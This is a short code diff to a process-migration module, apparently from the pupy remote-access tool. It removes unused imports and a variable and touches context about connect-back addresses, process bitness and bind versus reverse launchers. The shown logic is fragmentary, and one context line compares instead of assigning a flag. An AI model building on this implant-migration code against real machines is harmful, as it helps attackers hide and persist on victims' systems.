@@ -1,7 +1,7 @@
 import pupygen
 import time
-import rpyc
-from pupygen import parse_scriptlets
+
+# from pupygen import parse_scriptlets
 
 def has_proc_migrated(client, pid):
     for c in client.pupsrv.clients:
@@ -17,7 +17,6 @@ def migrate(module, pid, keep=False, timeout=30, bindPort=None):
                 When bindPort!=None and the current launcher uses a REVERSE connection (e.g. connect, auto_proxy), bindPort is not used in this function
     '''
     module.client.load_package("pupwinutils.processes")
-    dllbuf=b""
     isProcess64bits=False
     isBindConnection=False #If current launcher uses a BIND connection, isBindConnection == True
     module.success("looking for configured connect back address ...")
@@ -40,7 +39,7 @@ def migrate(module, pid, keep=False, timeout=30, bindPort=None):
         arch='x86'
         module.success("process is 32 bits")
     conf=module.client.get_conf()
-    
+
     #Manage when current launcher uses a BIND connection (and not a REVERSE connection)
     if module.client.desc['launcher'] == "bind":
         isBindConnection == True
